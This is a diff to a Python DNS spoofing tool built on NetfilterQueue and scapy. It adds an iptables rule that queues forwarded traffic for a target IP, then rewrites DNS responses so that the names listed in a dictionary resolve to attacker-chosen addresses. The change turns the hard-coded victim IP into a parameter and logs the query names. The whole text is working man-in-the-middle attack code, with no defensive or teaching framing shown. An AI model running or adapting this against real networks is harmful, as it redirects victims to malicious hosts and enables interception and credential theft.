@@ -11,10 +11,10 @@ class Spoof:
         self.queueNum = queueNum
         self.queue = NetfilterQueue()
  
-    def __call__(self):
+    def __call__(self, targetIp):
         print("Spoofing....")
         #{self.queueNum}
-        os.system('sudo iptables -I FORWARD -d 10.0.123.4 -j NFQUEUE --queue-num 1')
+        os.system(f'sudo iptables -I FORWARD -d {targetIp} -j NFQUEUE --queue-num 1')
         self.queue.bind(self.queueNum, self.poison)
         try:
             self.queue.run()
@@ -27,7 +27,9 @@ class Spoof:
         scapyPacket = IP(packet.get_payload())
         if scapyPacket.haslayer(DNSRR):
             try:
+                
                 queryName = scapyPacket[DNSQR].qname
+                print(queryName)
                 if queryName in self.dictionary:
                     scapyPacket[DNS].an = DNSRR(
                         rrname=queryName, rdata=self.dictionary[queryName])
@@ -47,9 +49,9 @@ class Spoof:
         return packet.accept()
  
 
-def startDNSaltering(dictionary):
+def startDNSaltering(dictionary, targetIp):
     queueNum = 1
     spoof = Spoof(dictionary, queueNum)
-    spoof()
+    spoof(targetIp)
 
 
